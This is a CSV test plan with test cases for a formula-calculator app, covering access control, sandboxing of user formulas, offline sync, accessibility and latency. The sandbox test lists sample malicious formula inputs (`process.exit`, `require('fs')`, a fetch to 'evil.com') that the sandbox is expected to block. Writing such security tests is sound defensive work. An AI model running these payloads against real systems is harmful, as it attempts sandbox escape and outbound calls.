"TEST-AUTH-001","User Authentication","Security","Integration","Critical","true","High","Verify that a user cannot access another user's data (e.g., calculation history) by manipulating API requests. This validates the data isolation requirement.","Critical - A data breach would destroy user trust and have legal (GDPR/CCPA) consequences.","Medium","Two distinct user accounts (User A, User B) exist with pre-populated data. User A is authenticated and has a valid JWT.","1. Authenticate as User A. 2. Obtain JWT for User A. 3. Craft an API request to `GET /api/v1/history` but use a resource ID belonging to User B. 4. Send the request with User A's JWT.","The API must return a 403 Forbidden or 404 Not Found status code. The response body must not contain any data belonging to User B.","Two distinct test users with known resource IDs.","Supertest, Jest, PostgreSQL client","4","8","2","Backend API, JWT AuthGuard, Database","Integration environment with a seeded test database.","100% test pass rate across all user-scoped endpoints.","Critical - Data breach vulnerability.","Every commit to the backend.","Medium","Test users can be persistent in the test database.","This is a primary security test for multi-tenancy.","N/A","N/A"
"TEST-SANDBOX-001","Custom Mode Execution","Security","Integration","Critical","true","High","Verify that a user-defined formula attempting to access Node.js internals (e.g., `process.exit()`) or network resources fails and is contained within the `isolated-vm` sandbox.","Critical - A sandbox escape could lead to Remote Code Execution (RCE) on the backend infrastructure.","High","The Formula Execution Lambda is deployed. The test framework can invoke the Lambda directly.","1. Define a custom formula payload containing malicious code (e.g., `process.exit(1)`, `require('fs')`, `fetch('http://evil.com')`). 2. Invoke the Lambda with this payload. 3. Monitor Lambda logs and response.","The Lambda execution must complete successfully but return a structured error indicating a reference error or security violation. The Lambda process must not terminate or hang. No outbound network calls should be made.","A suite of malicious formula strings.","AWS SDK for Lambda invocation, Jest","6","12","4","AWS Lambda, `isolated-vm` library","AWS dev/integration environment.","100% of sandbox escape attempts are blocked and correctly reported.","Critical - System compromise.","Every commit to the Lambda function.","Low","N/A","This test validates the core security promise of the user-extensible feature.","Execution should fail fast, within the configured timeout.","N/A"
"TEST-OFFLINE-001","Offline Data Synchronization","Functional","E2E","High","true","Medium","Verify the 'last-write-wins' conflict resolution strategy for a user variable modified offline.","High - Incorrect conflict resolution can lead to silent data loss, destroying user trust.","High","User is logged in. A variable `x` exists with value `1`.","1. Go offline. 2. In the UI, change variable `x` to `2`. 3. In a separate process (simulating another device), make a direct API call to update `x` to `3`. 4. Go back online in the UI. 5. Wait for the sync process to complete.","The UI should eventually display the value `3` for variable `x`. A notification should inform the user that their offline change was superseded by a more recent update.","A test user account with a pre-defined variable.","Cypress (with network control), Supertest (for direct API call)","8","20","8","Frontend UI, Backend API, IndexedDB","Full-stack staging environment.","The server-authoritative value (`3`) is correctly reflected on the client after sync.","High - User data loss/corruption.","Every release.","High","Reset test user's variables.","N/A","Sync should complete within 5 seconds of reconnection.","N/A"
"TEST-A11Y-001","Accessibility","Accessibility","E2E","High","true","High","Verify that the entire user registration flow is compliant with WCAG 2.1 AA standards, including keyboard navigation and screen reader support.","Medium - Non-compliance can lead to legal action and alienates a segment of the user base.","Medium","Registration page is available.","1. Navigate to the registration page. 2. Using only the Tab and Enter/Space keys, fill out all form fields. 3. Trigger validation errors and verify they are announced by a screen reader. 4. Successfully submit the form.","The user can complete registration without using a mouse. All controls have accessible names. All validation errors are programmatically announced. All color contrast ratios meet or exceed 4.5:1.","A unique, disposable email address for registration.","Cypress, Axe-core, NVDA/VoiceOver (for manual validation)","6","10","4","Registration UI","Frontend running on any environment.","Zero critical or serious violations reported by Axe. Successful completion of manual screen reader test.","Medium - Application is unusable for users with certain disabilities.","Every release.","Low","Delete the created test user.","N/A","N/A","This is the primary focus of the test."
"TEST-PERF-001","API Performance","Performance","System","High","true","High","Verify that 95% of data retrieval API requests (HTTP GET) complete in under 200ms under normal load, as per REQ-1-042.","Medium - Poor performance leads to user frustration and abandonment.","High","The application is deployed to a production-like performance testing environment. Load testing scripts are prepared.","1. Define a load profile simulating 'normal load' (e.g., 500 requests per minute). 2. Execute the load test against all GET endpoints for a duration of 15 minutes. 3. Collect P95 latency metrics from the API Gateway and application monitoring tools.","The P95 latency for all targeted GET endpoints remains below the 200ms threshold for the duration of the test.","A sufficiently large and realistic dataset in the performance environment database.","JMeter or k6, New Relic or CloudWatch Metrics","10","24","12","Full backend stack, Performance test environment","Isolated, production-spec performance testing environment.","P95 latency < 200ms.","Medium - Poor user experience.","Before every major release.","High","N/A","Do not run load tests against the production environment.","This is the primary focus of the test.","N/A"
